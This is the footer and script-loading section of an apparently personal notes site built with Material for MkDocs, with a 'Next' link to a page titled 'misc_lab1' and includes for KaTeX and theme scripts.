            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                misc_lab1
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright 2025 AlabTNT
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.action.edit", "navigation.tracking", "navigation.expand", "navigation.top", "navigation.footer", "navigation.tabs", "navigation.instant", "navigation.instant.progress"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
        <script src="../../javascripts/katex.js"></script>
      
        <script src="../../javascripts/katex2.js"></script>
      
        <script src="../../javascripts/rb.js"></script>
      
        <script src="https://cdn.jsdelivr.net/gh/jayi0908/jayi0908-trigonometry@master/docs/javascripts/music.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>